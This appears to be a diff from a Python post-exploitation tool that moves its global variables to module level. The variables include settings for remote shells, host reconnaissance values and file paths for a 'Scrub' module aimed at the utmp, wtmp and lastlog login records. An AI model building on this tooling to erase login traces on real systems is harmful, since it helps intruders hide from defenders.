@@ -22,6 +22,30 @@ import operator
 import SocketServer, SimpleHTTPServer
 from math import log
 
+socksize = 4096                            
+activePID = []
+
+now = datetime.datetime.now()
+logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
+
+## Global variables for remote shells are defined during the creation process
+## Variables for Scrub module. Do not change unless you know what you're doing. 
+UTMP_STRUCT_SIZE    = 384
+LASTLOG_STRUCT_SIZE = 292
+UTMP_FILEPATH       = "/var/run/utmp"
+WTMP_FILEPATH       = "/var/log/wtmp"
+LASTLOG_FILEPATH    = "/var/log/lastlog"
+
+    ## Get user and environment information
+distro = os.uname()[1]
+distro2 = platform.linux_distribution()[0]
+Home_Dir = os.environ['HOME']
+User_Ip_Address = socket.gethostbyname(socket.gethostname())
+if os.geteuid() != 0:
+    currentuser = "nonroot"
+else:
+    currentuser = "root"
+
 
 def reaper():                              
     while activePID:                        
@@ -178,50 +202,5 @@ def users():
             if uid > 500 and uid < 32328:
                 userlist.append(fields[0])
 
-def globalvars():
-    global Home_Dir
-    global User_Ip_Address
-    global UTMP_STRUCT_SIZE    
-    global LASTLOG_STRUCT_SIZE
-    global UTMP_FILEPATH      
-    global WTMP_FILEPATH       
-    global LASTLOG_FILEPATH
-    global distro
-    global distro2
-    global currentuser
-    global socksize
-    global activePID
-    global conn
-    global logtime
-    global now
-
-    ## Set basic socket and process information
-    socksize = 4096                            
-    activePID = []
-
-    now = datetime.datetime.now()
-    logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
-
-    ## Global variables for remote shells are defined during the creation process
-    ## Variables for Scrub module. Do not change unless you know what you're doing. 
-    UTMP_STRUCT_SIZE    = 384
-    LASTLOG_STRUCT_SIZE = 292
-    UTMP_FILEPATH       = "/var/run/utmp"
-    WTMP_FILEPATH       = "/var/log/wtmp"
-    LASTLOG_FILEPATH    = "/var/log/lastlog"
-
-    ## Get user and environment information
-    distro = os.uname()[1]
-    distro2 = platform.linux_distribution()[0]
-    Home_Dir = os.environ['HOME']
-    User_Ip_Address = socket.gethostbyname(socket.gethostname())
-    if os.geteuid() != 0:
-        currentuser = "nonroot"
-    else:
-        currentuser = "root"
-
-    
-
-globalvars()
 
 
